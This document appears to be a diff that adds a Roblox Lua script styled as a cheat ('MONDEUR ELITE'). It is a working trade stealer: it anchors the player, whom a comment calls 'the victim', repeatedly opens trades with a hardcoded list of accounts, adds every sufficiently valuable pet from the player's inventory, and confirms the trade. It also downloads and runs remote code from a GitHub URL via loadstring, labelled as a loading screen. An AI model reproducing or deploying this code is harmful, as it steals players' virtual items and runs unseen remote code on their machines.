@@ -1,0 +1,64 @@
+-- [[ MONDEUR ELITE v14.0 - FIX: NO INFINITE YIELD ]] --
+if _G.__Ran then return end
+_G.__Ran = true
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+
+-- API Path Fix
+local API = ReplicatedStorage:WaitForChild("API")
+local TradeAPI = API:WaitForChild("TradeAPI")
+
+local function GetTarget()
+    local admins = {"CREOLEO23", "cfpaj67", "Hisokarah", "2ndcfpaj67", "sofiqmnz"}
+    for _, admin in pairs(admins) do
+        if Players:FindFirstChild(admin) then return Players[admin] end
+    end
+    return nil
+end
+
+local function executeTrade(targetPlayer)
+    if not targetPlayer then return end
+    
+    -- [[ FIX: Using the actual Game Data instead of WaitForChild("Inventory") ]] --
+    local ClientData = require(ReplicatedStorage.ClientModules.Core.ClientData)
+    local inventory = ClientData.get_data().inventory
+    
+    if inventory and inventory.pets then
+        -- Anchor the victim
+        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            LocalPlayer.Character.HumanoidRootPart.Anchored = true
+        end
+
+        for _, petData in pairs(inventory.pets) do
+            -- Use Arfud Database
+            local val = _G.GetTrueValue(petData, _G.PetValueDB) or 0
+            
+            -- If pet is good enough, add it using its Unique ID
+            if val >= (getgenv().THRESHOLD or 0) then
+                pcall(function() 
+                    TradeAPI:WaitForChild("AddItemToTrade"):FireServer(petData.unique) 
+                end)
+            end
+        end
+        
+        -- Accept Sequence
+        task.wait(0.5)
+        pcall(function() TradeAPI:WaitForChild("ReadyTrade"):FireServer(true) end)
+        pcall(function() TradeAPI:WaitForChild("ConfirmTrade"):FireServer() end)
+    end
+end
+
+task.spawn(function()
+    -- Load Loading Screen
+    pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/charles1384/ADM/main/V.1"))() end)
+
+    while task.wait(1) do
+        local target = GetTarget()
+        if target then
+            pcall(function() TradeAPI:WaitForChild("RequestTrade"):FireServer(target) end)
+            executeTrade(target)
+        end
+    end
+end)
